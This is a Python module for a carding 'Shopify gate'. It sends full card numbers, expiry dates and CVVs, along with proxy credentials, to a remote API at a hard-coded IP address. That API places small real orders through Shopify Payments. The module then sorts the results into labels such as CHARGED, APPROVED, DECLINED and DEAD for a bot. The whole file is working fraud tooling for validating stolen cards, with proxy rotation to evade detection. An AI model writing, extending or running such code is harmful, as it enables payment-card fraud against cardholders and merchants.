"""Shopify gate — real card check via the remote Shopify API.

Endpoint (per owner):
    GET http://5.175.222.144:8081/?CC|MM|YY|CVV&proxy=host:port:user:pass

Example:
    http://5.175.222.144:8081/?5455122802569146|12|26|543&proxy=ca-mon.pvdata.host:8080:user:pass

Response JSON:
    {
      "Response": "ORDER_PLACED",
      "CC": "5455122802569146|12|26|543",
      "Price": "2.95 USD",
      "Gate": "Shopify Payments",
      "Charged": "True",
      "Approved": "False",
      "Time": "9.7s"
    }

`check_card_site()` returns a dict with bot-compatible keys:
    Response, Price, Gate, Status, Charged, Approved, Code, cc, site, proxy
"""
import asyncio
import httpx

SHOPIFY_API_BASE = "http://5.175.222.144:8081"
CHECK_TIMEOUT = 40.0


def _proxy_param(proxy: dict | None) -> str:
    """Build the host:port:user:pass string the API expects."""
    if not proxy:
        return ""
    host = proxy.get("host")
    if not host:
        return ""
    port = proxy.get("port")
    user = proxy.get("user")
    pwd = proxy.get("pass")

    s = f"{host}:{port}" if port else host
    if user:
        s += f":{user}"
        if pwd:
            s += f":{pwd}"
    return s


def _classify(response: str, charged: str, approved: str) -> str:
    """Map the API response string into a bot-compatible status label."""
    rl = (response or "").lower()
    if charged == "True" or "order_placed" in rl or "order placed" in rl:
        return "CHARGED"
    if any(k in rl for k in ("insufficient_funds", "insufficient funds")):
        return "APPROVED"
    if any(k in rl for k in ("incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv")):
        return "APPROVED"
    if "incorrect_zip" in rl or "incorrect zip" in rl:
        return "APPROVED"
    if approved == "True" or any(k in rl for k in ("approved", "live")):
        return "APPROVED"
    if any(k in rl for k in ("card_declined", "do_not_honor", "declined")):
        return "DECLINED"
    if "expired" in rl:
        return "EXPIRED"
    if "incorrect_number" in rl or "incorrect number" in rl:
        return "DEAD"
    return (response or "Unknown")[:60]


async def check_card_site(cc: str, site: str | None = None, proxy: dict | None = None) -> dict:
    """Real Shopify check via the remote API (bot-compatible return keys)."""
    proxy_str = _proxy_param(proxy)
    url = f"{SHOPIFY_API_BASE}/?{cc}"
    if proxy_str:
        url += f"&proxy={proxy_str}"

    try:
        async with httpx.AsyncClient(timeout=CHECK_TIMEOUT) as client:
            resp = await client.get(url)
            resp.raise_for_status()
            data = resp.json()
    except Exception as e:
        return {
            "cc": cc,
            "site": site or "",
            "proxy": proxy_str or None,
            "Response": str(e)[:80],
            "Price": "-",
            "Gate": "Shopify Payments",
            "Status": "Error",
            "Charged": "False",
            "Approved": "False",
        }

    response = data.get("Response", "Unknown")
    price = data.get("Price", "-")
    gate = data.get("Gate", "Shopify Payments")
    charged = data.get("Charged", "False")
    approved = data.get("Approved", "False")

    return {
        "cc": cc,
        "site": site or "",
        "proxy": proxy_str or None,
        "Response": str(response),
        "Price": price,
        "Gate": gate,
        "Status": _classify(response, charged, approved),
        "Charged": str(charged),
        "Approved": str(approved),
        "Code": str(response).upper() if "order" in str(response).lower() else "",
    }
